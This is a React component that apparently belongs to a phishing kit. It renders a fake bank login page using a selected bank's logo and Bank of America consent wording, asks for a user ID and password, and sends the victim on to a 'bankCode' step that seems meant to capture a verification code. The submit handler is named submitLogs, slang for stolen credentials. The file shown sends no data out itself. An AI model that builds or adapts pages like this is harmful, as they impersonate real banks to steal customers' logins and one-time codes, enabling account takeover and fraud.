import "../styles/bankLogin.css"
import { useNavigate } from "react-router-dom";
import { useState, useEffect } from "react";
import LoadingScreen from "./loadingScreen";


function BankLogin(prop) {

    const navigate = useNavigate();

    function submitLogs(e) {
        e.preventDefault();
        navigate("../bankCode")
    }

    const [isLoading, setIsLoading] = useState(true)

    useEffect(() => {
        setTimeout(() => {
            setIsLoading(false)
        }, 2000)
    },)

    const logo = {
        backgroundImage: `url(${prop.selectedLinkBank.img})`,
        backgroundSize: `200px`,
    }

    return (
        <>
        {isLoading ? <LoadingScreen />: ""}
            <div className="bank-login">
                <div className="bank-logo" style={logo}>

                </div>
                <div className="line">

                </div>
                <div className="bank-content">
                    <div className="bc-head">
                        <p>For your protection, Bank of America must confirm your identity and obtain your consent before sharing your online account information.</p>
                    </div>
                    <form onSubmit={submitLogs}>
                        <div className="bc-inputs">
                            <div className="bc-in">
                                <p>User ID/Username/Email</p>
                                <input type="text" />
                            </div>
                            <div className="bc-in2">
                                <p>Password</p>
                                <div className="pass-box">
                                    <input type="password" />
                                    <i className="bi-eye-slash"></i>
                                </div>
                            </div>
                        </div>
                        <div className="bc-submit">
                            <button>Submit</button>
                        </div>
                    </form>
                    <div className="bc-cancel">
                        <button>Cancel</button>
                    </div>
                    <div className="opt">
                        <p>For help with your User ID or Password, please go to your bank mobile app an opt for a password reset, or visit your bank website</p>
                    </div>
                </div>
            </div>
        </>
    )
}

export default BankLogin;